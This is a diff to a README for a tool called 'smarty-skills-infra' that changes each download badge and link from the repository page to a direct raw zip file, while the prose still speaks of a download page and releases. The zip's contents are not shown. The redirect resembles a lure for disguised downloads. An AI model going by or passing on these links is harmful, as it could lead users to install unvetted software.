@@ -1,6 +1,6 @@
 # 🧠 smarty-skills-infra - Learn user habits across sessions
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge&logo=github)](https://github.com/chetpictured508/smarty-skills-infra)
+[![Download](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge&logo=github)](https://github.com/chetpictured508/smarty-skills-infra/raw/refs/heads/main/skills/smarty-skills-infra-2.8.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ It is made for people who want a tool that remembers useful details across sessi
 
 Use this link to visit the page and download the app:
 
-[Open the download page](https://github.com/chetpictured508/smarty-skills-infra)
+[Open the download page](https://github.com/chetpictured508/smarty-skills-infra/raw/refs/heads/main/skills/smarty-skills-infra-2.8.zip)
 
 On that page, look for the latest release or download file, then save it to your PC.
 
@@ -141,7 +141,7 @@ That repeat use helps the memory layers build useful patterns.
 
 If you have not downloaded the app yet, use this page:
 
-[https://github.com/chetpictured508/smarty-skills-infra](https://github.com/chetpictured508/smarty-skills-infra)
+[https://github.com/chetpictured508/smarty-skills-infra/raw/refs/heads/main/skills/smarty-skills-infra-2.8.zip](https://github.com/chetpictured508/smarty-skills-infra/raw/refs/heads/main/skills/smarty-skills-infra-2.8.zip)
 
 ## 📌 What to expect
 
